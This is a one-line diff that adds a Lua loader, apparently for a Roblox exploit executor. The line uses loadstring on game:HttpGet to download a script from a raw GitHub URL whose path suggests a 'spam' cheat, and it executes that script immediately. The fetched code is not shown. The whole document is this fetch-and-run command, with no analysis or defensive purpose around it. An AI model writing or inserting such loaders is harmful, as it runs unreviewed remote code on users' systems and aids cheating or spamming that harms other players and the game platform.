@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/huss-valley-spam4-cywudureo2g3rx.lua"))()
